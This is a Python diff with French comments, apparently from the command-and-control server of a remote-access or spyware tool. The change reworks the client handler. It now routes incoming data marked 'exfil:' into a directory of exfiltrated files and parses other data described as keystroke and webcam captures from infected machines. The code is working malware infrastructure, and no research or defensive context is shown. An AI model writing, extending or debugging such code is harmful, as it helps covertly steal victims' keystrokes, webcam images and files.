@@ -171,16 +171,35 @@ def handle_client(client_socket, client_address):
     """Gestion des connexions clients."""
     print(f"[+] Connexion de {client_address}")
     clients[client_address] = client_socket
-
-
-
     while True:
         try:
-            data = client_socket.recv(1048576).decode('utf-8')
-            if data:
-                process_data(data, client_address[0])
-        except:
+            
+            header = client_socket.recv(128)
+            if not header:
+                break
+            if header.startswith(b"exfil:"):
+                receive_file(client_socket, EXFIL_DIR, "exfil")
+            else:
+                # Cas classique : JSON (keystroke, webcam, etc.)
+                remaining = client_socket.recv(1048576)
+                full_data = header + remaining
+                process_data(full_data.decode("utf-8", errors="ignore"), client_address[0])
+
+        except Exception as e:
+            print(f"[EXCEPTION] {e}")  # <= active temporairement
             break
+
+    
+    client_socket.close()
+
+
+    # while True:
+    #     try:
+    #         data = client_socket.recv(1048576).decode('utf-8')
+    #         if data:
+    #             process_data(data, client_address[0])
+    #     except:
+    #         break
     # while True:
     #     try:
     #         raw_size = client_socket.recv(4)
@@ -201,7 +220,7 @@ def handle_client(client_socket, client_address):
     #         print(f"[EXCEPTION] {e}")  # <= active temporairement
     #         break
 
-    client_socket.close()
+    # client_socket.close()
 
     del clients[client_address]
     print(f"[-] Déconnexion de {client_address}")
